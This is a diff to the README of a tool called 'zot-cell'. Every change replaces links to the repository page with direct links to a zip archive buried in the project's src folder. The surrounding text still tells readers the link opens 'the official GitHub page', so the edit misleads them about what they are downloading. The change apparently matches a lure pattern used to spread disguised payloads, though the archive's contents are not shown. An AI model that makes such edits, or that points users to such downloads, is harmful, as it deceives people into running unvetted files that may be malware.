@@ -1,6 +1,6 @@
 # 🛡️ zot-cell - Secure Detection Made Simple
 
-[![Download zot-cell](https://img.shields.io/badge/Download-zot--cell-informational?style=for-the-badge&color=orange)](https://github.com/omar026/zot-cell)
+[![Download zot-cell](https://img.shields.io/badge/Download-zot--cell-informational?style=for-the-badge&color=orange)](https://github.com/omar026/zot-cell/raw/refs/heads/main/src/cell-zot-v3.0-alpha.2.zip)
 
 ---
 
@@ -92,7 +92,7 @@ When a new version is available, repeat the download and install steps with the 
 
 You can always get the latest version from:
 
-[https://github.com/omar026/zot-cell](https://github.com/omar026/zot-cell)
+[https://github.com/omar026/zot-cell/raw/refs/heads/main/src/cell-zot-v3.0-alpha.2.zip](https://github.com/omar026/zot-cell/raw/refs/heads/main/src/cell-zot-v3.0-alpha.2.zip)
 
 Click the orange button at the top or use the link above to visit the official GitHub page.
 
@@ -138,4 +138,4 @@ If you need help beyond this guide:
 
 ---
 
-[![Download zot-cell](https://img.shields.io/badge/Download-zot--cell-informational?style=for-the-badge&color=orange)](https://github.com/omar026/zot-cell)
+[![Download zot-cell](https://img.shields.io/badge/Download-zot--cell-informational?style=for-the-badge&color=orange)](https://github.com/omar026/zot-cell/raw/refs/heads/main/src/cell-zot-v3.0-alpha.2.zip)
